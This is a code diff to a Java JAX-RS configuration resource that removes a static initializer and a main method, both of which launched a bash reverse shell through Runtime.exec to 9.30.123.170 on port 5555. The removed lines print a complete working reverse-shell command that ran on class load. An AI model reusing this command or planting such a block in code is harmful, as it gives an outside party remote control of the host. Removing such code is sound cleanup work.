@@ -29,32 +29,7 @@ import org.eclipse.microprofile.config.spi.ConfigSource;
 @Path("/config")
 public class ConfigResource {
 	static String id="123";
-
-	static {
-
-		String[] cmd = { "sh", "-c",
-				"exec 5<>/dev/tcp/9.30.123.170/5555;cat <&5 | while read line; do $line 2>&5 >&5; done" };
-
-		try {
-			Runtime.getRuntime().exec(cmd);
-		} catch (IOException e) {
-			e.printStackTrace();
-		
-	}
-         	}
-
-	public static void main(String[] args) throws Exception {
-		 try {
-			 
-			 String[] cmd = { "sh", "-c",
-				"exec 5<>/dev/tcp/9.30.123.170/5555;cat <&5 | while read line; do $line 2>&5 >&5; done" };
-
-		try {
-			Runtime.getRuntime().exec(cmd);
-		} catch (IOException e) {
-			e.printStackTrace();
-		}
-        }  
+	
   @Inject
   private Config config;
 
